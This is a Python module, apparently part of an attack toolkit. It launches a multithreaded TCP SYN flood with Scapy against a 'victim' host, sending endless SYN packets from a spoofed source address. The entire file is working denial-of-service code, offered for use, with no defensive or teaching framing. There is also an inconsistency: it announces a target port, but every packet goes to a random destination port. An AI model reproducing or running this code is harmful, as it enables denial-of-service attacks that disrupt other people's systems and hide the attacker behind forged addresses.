import threading
from scapy.all import *
from random import randint
from func.spoof_addr import spoof_addr

def SYNflood(victim,port,quiet,THREAD_COUNT,terminal = None):
    try:
        if terminal == None:
            print("[+] Flooding "+victim+" with TCP SYN packets on port "+str(port))
        else:
            terminal.write('\n[+] Flooding '+victim+" with TCP SYN packets on port "+str(port))
        all_threads = []
        tc = THREAD_COUNT 
        spoofaddr = spoof_addr(terminal=terminal)
        for i in range(tc):
            t = threading.Thread(target=__floodtarget,args=(victim,port,spoofaddr,quiet,terminal))
            t.start()
            all_threads.append(t)
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))

def __floodtarget(victim,port,spoof_addr,quiet,terminal):
    try:
        while 1:
            packet = IP(src=spoof_addr,dst=victim)/TCP(flags='S',sport = randint(1,65535),dport = randint(1,65535))
            send(packet, verbose = 0)    
            if not quiet:
                if terminal == None:
                    print("[+] Sent packet "+str(packet.show()))
                else:
                    terminal.write('\n[+] Sent packet '+str(packet.show()))
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
